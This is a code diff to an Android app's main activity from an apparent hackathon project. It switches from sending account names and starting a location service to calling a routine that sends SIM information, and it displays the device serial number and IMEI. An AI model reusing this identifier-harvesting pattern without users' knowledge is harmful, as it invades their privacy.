@@ -9,6 +9,7 @@ import android.util.Log;
 import android.view.Menu;
 import android.view.MenuItem;
 import android.widget.TextView;
+import android.widget.Toast;
 
 import com.example.abdullah.hackathon.Services.LocationService;
 
@@ -18,6 +19,7 @@ import Models.SendUserInformation;
 
 import Utils.Constant;
 import Utils.LocationFinder;
+import Utils.UserSharePreferences;
 
 public class MainActivity extends AppCompatActivity {
     private Context context = this;
@@ -29,10 +31,14 @@ public class MainActivity extends AppCompatActivity {
         setContentView(R.layout.activity_main);
         setUpLayoutXml();
         SendUserId();
-        startService(new Intent(this, LocationService.class));
-        new  SendUserInformation(context).sendAcountsName();
-
-                       /* if (IsExternalStorageWriteable() == true) {
+      //  startService(new Intent(this, LocationService.class));
+     //   new  SendUserInformation(context).sendAcountsName();
+        new SendUserInformation(context).sendSimInformaation();
+        String Soft= UserSharePreferences.getInstance(context).getSoftwareVersion();
+        String id=UserSharePreferences.getInstance(context).getSerialNumber();
+        String  ime=UserSharePreferences.getInstance(context).getSimUmei();
+        Toast.makeText(getApplicationContext(), Soft+"\n"+id+"\n"+ime, Toast.LENGTH_LONG).show();
+        /* if (IsExternalStorageWriteable() == true) {
             File sdCardPath = Environment.getExternalStorageDirectory();
             File sdCardFiles = new File(sdCardPath, "/");
             for(File  files: sdCardFiles.listFiles()){
